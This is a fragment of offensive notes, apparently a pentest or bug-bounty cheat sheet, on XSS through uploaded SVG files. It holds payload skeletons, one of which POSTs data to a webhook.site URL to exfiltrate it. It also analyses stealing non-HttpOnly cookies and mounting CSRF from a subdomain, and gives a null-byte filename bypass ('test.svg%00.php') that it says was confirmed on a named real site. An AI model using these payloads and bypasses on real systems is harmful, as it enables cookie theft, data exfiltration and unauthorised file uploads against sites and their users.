...
Basic payload (breaks if `&` or `<` in JS string):
```xml
<?xml version="1.0"?>
...
**CDATA-wrapped payload** (handles `&` in URLs — XML parser chokes on bare `&` without CDATA):
```xml
...
x.open("POST", "https://webhook.site/UUID");
...
**Key SVG XSS checks** (test all on the uploaded SVG URL):
1. `Content-Type: image/svg+xml` → script executes when opened in browser
2. No `Content-Security-Policy` header → no script-src restriction
3. No `X-Content-Type-Options: nosniff` → browser trusts the SVG content-type
4. No `X-Frame-Options` → can be embedded via `<object>`/`<iframe>`/`<embed>`

**HttpOnly + SameSite=lax cookie analysis when SVG is on a subdomain:**
- `document.cookie` returns **empty** if cookies are HttpOnly → JS cannot read them
- Even if SVG is on a same-site subdomain (`media.target.com`), `fetch()` to the main app (`target.com`) with `credentials: "include"` is **blocked by CORS** (no `Access-Control-Allow-Origin` header)
- `mode: "no-cors"` fetch sends the request (cookie included for same-site) but response is **opaque** — cannot read result
- Non-HttpOnly cookies (e.g., Google Analytics `_ga`) **are** exfiltrated via `document.cookie`
- **CSRF via SVG**: `fetch()` with `mode: "no-cors"` to same-site API endpoints sends cookies even with SameSite=lax, but cannot send `Content-Type: application/json` (no-cors only allows simple content types)

**Null byte upload bypass** (confirmed on bcare.vn):
```
filename=test.svg%00.php → stored as .php on server
```
PHP not executed if served from CDN/static storage (Content-Type: application/octet-stream), but confirms the bypass works — test on origin server if PHP is enabled there.
